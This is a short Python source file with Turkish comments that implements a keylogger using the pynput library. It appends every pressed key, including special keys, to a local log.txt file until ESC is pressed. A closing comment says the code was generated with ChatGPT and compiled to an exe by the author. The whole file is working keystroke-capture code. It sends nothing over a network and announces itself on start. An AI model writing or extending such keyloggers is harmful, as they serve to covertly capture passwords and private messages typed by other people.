from pynput import keyboard

#Ömer Faruk Baysal

def tus_basildi(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as dosya:
            dosya.write(f"{key.char}")
    except AttributeError:
        # Özel tuşlar (Enter, Shift, vb.)
        with open("log.txt", "a", encoding="utf-8") as dosya:
            dosya.write(f"[{key}]")

def programi_durdur(key):
    if key == keyboard.Key.esc:
        print("\n⛔ Program durduruldu (ESC tuşuna basıldı).")
        return False

# Dinleyici başlat
print("⌨️ Keylogger başlatıldı. Durdurmak için ESC tuşuna bas.")
with keyboard.Listener(on_press=tus_basildi, on_release=programi_durdur) as dinleyici:
    dinleyici.join()

    #Kodlar ChatGPT ile oluşturulmuş olup exe dosyası tarafımca oluşturulmuştur.